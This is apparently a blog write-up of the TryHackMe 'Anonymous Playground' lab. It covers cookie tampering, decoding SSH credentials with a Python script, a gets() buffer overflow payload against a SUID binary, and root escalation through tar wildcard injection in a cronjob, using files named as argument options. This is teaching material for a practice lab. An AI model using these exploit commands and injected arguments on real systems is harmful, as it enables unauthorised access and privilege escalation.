---
title: "TryHackMe Anonymous Playground"
categories: [TryHackMe]
tags: [linux, cookie, data-encoding, reverse-engineering, buffer-overflow, cronjob]
media_subpath: /images/tryhackme_anonymous_playground
image:
  path: room-image.png
---

[This room](https://tryhackme.com/room/anonymousplayground) started from cookie manipulation leading to decoding a cipher. Decoded data used to gain SSH shell. Then after analyzing binary exploited it using buffer overflow. Root escalation privilege was achieved by exploiting a cronjob


## Nmap Scan

Starting off with an nmap scan

```console
$ nmap -sS -sC -sV -T4 10.10.211.249 
Starting Nmap 7.95 ( https://nmap.org ) at 2025-05-17 15:52 BST
Nmap scan report for 10.10.211.249
Host is up (0.030s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 60:b6:ad:4c:3e:f9:d2:ec:8b:cd:3b:45:a5:ac:5f:83 (RSA)
|   256 6f:9a:be:df:fc:95:a2:31:8f:db:e5:a2:da:8a:0c:3c (ECDSA)
|_  256 e6:98:52:49:cf:f2:b8:65:d7:41:1c:83:2e:94:24:88 (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-title: Proving Grounds
|_http-server-header: Apache/2.4.29 (Ubuntu)
| http-robots.txt: 1 disallowed entry 
|_/zydhuakjp
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

```

There is a `robots.txt` containing this path: `/zydhuakjp`

Just by looking at website and didn't find anything useful decided to go to directory from robots.txt

Looking at it went check the cookie, here we see its value set to "denied"

![Webpage](webpage.png)

![cookie](web-cookie.png)

After changing value to "granted" and refreshing the page appeared encoded text

![Access-granted](access-granted.png)

## Decoding cipher / Magna flag

### Decoding cipher

Okay so not to take too long - tested that decoding and pair of letters in cipher is the sum of its position in alhpabet (e.g hE, 8 and 5, sum = 13, 13th letter of alphabet is 'm'. With zA becase its sum is 27 it will be just 'a')
> **HINT** You're going to want to write a Python script for this. 'zA' = 'a'
{: .prompt-tip }

Wrote python script to automate decoding

```python
# hEzAdCfHzA::hEzAdCfHzAhAiJzAeIaDjBcBhHgAzAfHfN

cipher = ['hE', 'zA', 'dC', 'fH', 'zA', '::', 'hE', 'zA', 'dC', 'fH', 'zA', 'hA', 'iJ', 'zA', 'eI', 'aD', 'jB', 'cB', 'hH', 'gA', 'zA', 'fH', 'fN']
alphabet = ['a', 'b', 'c', 'd', 'e', 'f', 'g', 'h', 'i', 'j', 'k', 'l', 'm', 'n', 'o', 'p', 'q', 'r', 's', 't', 'u', 'v', 'w', 'x', 'y', 'z']

decoded_cipher = [] # decoded text will be stored here
for pair in cipher:
	if pair == "::":
		decoded_cipher.append("::")
		continue
		
	# +1 because of list indexing
	char1 = int(alphabet.index(pair[0]))+1 
	char2 = int(alphabet.index(pair[1].lower()))+1

	char_sum = char1 + char2
	
	decoded_char = '' # calculated char will be stored here 
	if char_sum == 27: # if zA pair
		decoded_char = 'a'
		decoded_cipher.append(decoded_char)
	else:
		decoded_char = alphabet[char_sum-1] # -1 because indexing starts from 0
		decoded_cipher.append(decoded_char)
	
formatted = ""
for char in decoded_cipher:
    formatted += char # to print as a string and not list 

print(formatted)
```

```console
$ python decrypt.py  
magna::mag[REDACTED]ant
```

Now having credentials we can log into SSH

### Magna flag

```console
magna@anonymous-playground:~$ cat flag.txt 
918[REDACTED]029
```

## Exploiting binary / Spooky flag

### Exploiting binary

Here noticed SUID file owned by root, it appears to be binary

![Binary](binary.png)

But just before analyzing binary I went to spooky's home folder, looks like we need to swith to this user

```console
-r-------- 1 spooky spooky   33 Jul  4  2020 flag.txt
```

Transferred this binary to my machine to open it in ghidra

![Transfer-binary](download-binary.png)

This program takes user input, but if input will be long enough it will overflow
![Binary-overflow-test](binary-overflow-test.png)


Looks like it just takes input BUT using gets, gets function doesn't limit input characters read
meaning we can can exceed size of local_48 buffer (64 bytes) causing buffer overflow

Found another function which sets to 0x539 (1337 in decimal), if you type `id spooky` in ssh shell his uid will be 1337, so we can redirect the return address of the program to  this function. Address of the `call_bash` function is on image below

![Ghidra-call_bash](ghidra-call_bash.png)

![Adress-of-call_bash-function](call_bash-address.png)

I was pretty sure that it will word but it didn't. Searched and found out that you need to
type `;cat after python command to keep pipe open, otherwise it will segfault again as cat waits for users input and just stays there so stdin isnt closing

[https://unix.stackexchange.com/questions/348458/what-is-meant-by-keeping-the-pipe-open](https://unix.stackexchange.com/questions/348458/what-is-meant-by-keeping-the-pipe-open)

```console
(python -c "print('A' * 72 + '\x57\x06\x40\x00\x00\x00\x00\x00')";cat) | ./hacktheworld
```

![Buffer-overflow-faile](failed-overflow.png)


Tried again and it still didnt work (but did with address ending 58 instead of 57)... Probably it expects the current stack 
before excecution 

[https://stackoverflow.com/questions/41912684/what-is-the-purpose-of-the-rbp-register-in-x86-64-assembler](https://stackoverflow.com/questions/41912684/what-is-the-purpose-of-the-rbp-register-in-x86-64-assembler)

```
0x00400657   PUSH   RBP        ; Save address of previous stack frame
0x00400658   MOV    RBP, RSP   ; Address of current stack frame
```

Example:

![Buffer-overflow-succeeded](buffer-overflow.png)

We can see ourselves as `spooky` user. Now stabilize the shell using 

```console
stty raw -echo; fg
```

![Spooky-shell](spooky-shell.png)

### Spooky flag

```console
spooky@anonymous-playground:/home/spooky$ cat flag.txt 
69e[REDACTED]9d7
```

## Privilege Escalation

Found cronjob running 

![Cronjob](cronjob.png)

I wanted to try use a PATH hijack because tar wasn't runnnig as configured path in the cronjob (just tar).
But firstly I decided to search how to exploit tar found `abusing tar wildcards` 
(* in the cronjob is wildcard). If you want, you can take a look:

[https://systemweakness.com/privilege-escalation-using-wildcard-injection-tar-wildcard-injection-a57bc81df61c](https://systemweakness.com/privilege-escalation-using-wildcard-injection-tar-wildcard-injection-a57bc81df61c)

To exploit it just type following commands and wait for cronjob to run. This will copy a bash shell with SUID permission in /tmp

```console
echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > /home/spooky/shell.sh    
echo "" > "--checkpoint-action=exec=sh shell.sh"
echo "" > --checkpoint=1
```


When the SUID bash shell appears run it with following:

```console
./bash -p
```

![root-shell](root.png)

Command above will open a root shell, now you can read the root flag

```console
bash-4.4# cat flag.txt
bc5[REDACTED]e66
```









